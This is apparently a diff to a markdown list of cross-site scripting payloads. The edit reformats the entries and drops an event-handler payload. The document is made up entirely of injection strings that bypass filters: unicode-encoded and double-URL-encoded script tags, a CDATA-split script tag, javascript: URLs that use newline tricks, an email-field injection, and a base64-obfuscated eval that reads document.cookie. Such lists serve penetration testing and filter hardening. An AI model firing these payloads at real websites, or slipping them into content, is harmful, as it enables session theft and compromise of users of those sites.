@@ -1,14 +1,13 @@
-```%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E```        For ASP Encoding
-
-```%253Cscript%253Ealert(1)%253C%252Fscript%253E````                                       double url enc
-
-```<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>```    XML Reflectionxss
-
-```"onauxclick=alert(1);//```
-
-```javascript://%250aalert(1)```									  where :// is required after protocol
-
-```"\"><s>test"@gmail.com```												   XSS in email id
+Older ASP encoding filter bypass
+```%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E```
+Double URL encoded
+```%253Cscript%253Ealert(1)%253C%252Fscript%253E```
+XML Reflection XSS
+```<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>```
+Where :// is required after protocol
+```javascript://%250aalert(1)```
+XSS in email addresses
+```"\"><s>test"@gmail.com```
   
 ```javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));```
 
